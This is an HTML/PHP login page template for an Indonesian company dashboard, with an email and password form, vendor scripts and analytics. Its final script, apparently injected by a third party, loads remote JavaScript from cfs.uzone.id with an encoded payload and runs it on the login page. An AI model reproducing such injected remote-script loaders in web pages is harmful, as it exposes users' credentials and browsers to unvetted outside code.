<!DOCTYPE html>
<html class="no-js css-menubar" lang="en">

 <meta http-equiv="content-type" content="text/html;charset=utf-8" /> 
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0, minimal-ui">
  <meta name="description" content="bootstrap admin template">
  <meta name="author" content="">

  <title>Login Ke Akun Anda</title>

  <link rel="apple-touch-icon" href="<?php echo base_url(); ?>assets/images/logo-asinusa.pngg">
  <link rel="shortcut icon" href="<?php echo base_url(); ?>assets/images/logo-asinusa.png">

  <!-- Stylesheets -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/css/bootstrap.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/css/bootstrap-extend.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/assets/css/site.min3f0d.css?v2.2.0">

  <!-- Skin tools (demo site only) -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/css/skintools.min3f0d.css?v2.2.0">
  <script src="<?php echo base_url(); ?>assets/global/js/sections/skintools.min.js"></script>

  <!-- Plugins -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/animsition/animsition.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/asscrollable/asScrollable.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/switchery/switchery.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/intro-js/introjs.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/slidepanel/slidePanel.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/vendor/flag-icon-css/flag-icon.min3f0d.css?v2.2.0">

  <!-- Page -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/assets/examples/css/pages/login-v3.min3f0d.css?v2.2.0">

  <!-- Fonts -->
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/fonts/web-icons/web-icons.min3f0d.css?v2.2.0">
  <link rel="stylesheet" href="<?php echo base_url(); ?>assets/global/fonts/brand-icons/brand-icons.min3f0d.css?v2.2.0">
  <link rel='stylesheet' href='http://fonts.googleapis.com/css?family=Roboto:300,400,500,300italic'>


  <!--[if lt IE 9]>
    <script src="../../global/vendor/html5shiv/html5shiv.min.js"></script>
    <![endif]-->

  <!--[if lt IE 10]>
    <script src="../../global/vendor/media-match/media.match.min.js"></script>
    <script src="../../global/vendor/respond/respond.min.js"></script>
    <![endif]-->

  <!-- Scripts -->
  <script src="<?php echo base_url(); ?>assets/global/vendor/modernizr/modernizr.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/breakpoints/breakpoints.min.js"></script>
  <script>
    Breakpoints();
  </script>
</head>
<body class="page-login-v3 layout-full">
  <!--[if lt IE 8]>
        <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="http://browsehappy.com/">upgrade your browser</a> to improve your experience.</p>
    <![endif]-->


  <!-- Page -->
  <div class="page animsition vertical-align text-center" data-animsition-in="fade-in"data-animsition-out="fade-out">>
    <div class="page-content vertical-align-middle">
      <div class="panel">
        <div class="panel-body">
          <div class="brand">
            <img class="brand-img" src="<?php echo base_url(); ?>assets/images/logo-asinusa.png" alt="...">
          </div>
          <form method="post" action="<?php echo base_url()?>dashboard/get_login">
            <div class="form-group form-material floating">
              <input type="email" class="form-control" name="username" pattern="[a-z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,}$">
              <label class="floating-label">Username</label>
            </div>
            <div class="form-group form-material floating">
              <input type="password" class="form-control" name="password" />
              <label class="floating-label">Password</label>
            </div>
            <button type="submit" class="btn btn-primary btn-block btn-lg margin-top-40">Login</button>
          </form>
          
        </div>
      </div>

      <footer class="page-copyright page-copyright-inverse">
        <p>2022 www.asinusa.co.id</p>
      </footer>
    </div>
  </div>
  <!-- End Page -->


  <!-- Core  -->
  <script src="<?php echo base_url(); ?>assets/global/vendor/jquery/jquery.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/bootstrap/bootstrap.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/animsition/animsition.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/asscroll/jquery-asScroll.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/mousewheel/jquery.mousewheel.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/asscrollable/jquery.asScrollable.all.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/ashoverscroll/jquery-asHoverScroll.min.js"></script>

  <!-- Plugins -->
  <script src="<?php echo base_url(); ?>assets/global/vendor/switchery/switchery.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/intro-js/intro.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/screenfull/screenfull.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/vendor/slidepanel/jquery-slidePanel.min.js"></script>

  <!-- Plugins For This Page -->
  <script src="<?php echo base_url(); ?>assets/global/vendor/jquery-placeholder/jquery.placeholder.min.js"></script>

  <!-- Scripts -->
  <script src="<?php echo base_url(); ?>assets/global/js/core.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/site.min.js"></script>

  <script src="<?php echo base_url(); ?>assets/global/assets/js/sections/menu.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/sections/menubar.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/sections/gridmenu.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/sections/sidebar.min.js"></script>

  <script src="<?php echo base_url(); ?>assets/global/js/configs/config-colors.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/assets/js/configs/config-tour.min.js"></script>

  <script src="<?php echo base_url(); ?>assets/global/js/components/asscrollable.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/js/components/animsition.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/js/components/slidepanel.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/js/components/switchery.min.js"></script>

  <script src="<?php echo base_url(); ?>assets/global/js/components/jquery-placeholder.min.js"></script>
  <script src="<?php echo base_url(); ?>assets/global/js/components/material.min.js"></script>


  <script>
    (function(document, window, $) {
      'use strict';

      var Site = window.Site;
      $(document).ready(function() {
        Site.run();
      });
    })(document, window, jQuery);
  </script>


  <!-- Google Analytics -->
  <script>
    (function(i, s, o, g, r, a, m) {
      i['GoogleAnalyticsObject'] = r;
      i[r] = i[r] || function() {
        (i[r].q = i[r].q || []).push(arguments)
      }, i[r].l = 1 * new Date();
      a = s.createElement(o),
        m = s.getElementsByTagName(o)[0];
      a.async = 1;
      a.src = g;
      m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '../../../../www.google-analytics.com/analytics.js',
      'ga');

    ga('create', 'UA-65522665-1', 'auto');
    ga('send', 'pageview');
  </script>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "cfs.uzone.id/2fn7a2/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582ECSaLdwqSpngWM8VnBkajp4KZ5C3cAZOb8I13d9pSul%2btyRuNNRsHuc6xmnS%2bOcSZYOymFj5odh5BnYvsa3iUDRKWM9l%2b7SUGoqxw2CjYhXBxqn0yeKqGQ2szEvU7hpvowANuEMmlioFVBPzyJqwOzgoUYitT8c2CwnMilngl8fN%2bnGwCczUh3fBXpn3pXqYqjId0Z8Y0NfX%2bqsEafg%2bKSB2d%2fFg%2bw8hUt%2bbsYJfuBS%2fNvGveeA5qDr06sb4gjvdA%2fSnSYiJo2fker8tBr2cdxEajpe8baDClE5p1k0bQBtlKXV5Im4NrgBWO1sfwcKbHMFQrXTKTcykl954f8EiSaVQr%2fIOfguzsfidOQxAQYLMuG43kk93FRnbPvgijY%2fwazFS5xMXfRiPhB2FV5xK0ZeaB%2fMQNDPuKc5sypOcYB3WNwmi2x2T%2bSNxV8HLDBwpVycUWNJMWxxut75mTfIRd4b%2f3Alm3xHDlB7vSh03fHYM2v4hq9Pw%2fzPx%2fQS4YEZig%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>


 
</html>